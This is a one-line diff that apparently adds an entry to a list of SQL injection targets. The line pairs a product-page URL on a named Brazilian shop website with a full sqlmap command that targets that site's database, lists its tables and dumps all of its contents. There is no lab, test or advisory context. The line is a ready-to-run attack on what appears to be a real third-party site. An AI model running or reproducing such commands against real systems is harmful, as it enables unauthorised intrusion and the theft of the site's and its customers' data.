@@ -1,0 +1,1 @@
+https://www.bestfantasy.com.br/produto.php?produto=786 (GET)  # sqlmap.py -u https://www.bestfantasy.com.br/produto.php?produto=786 -D bestfant_banco --tables --dump-all --threads 5 -v3
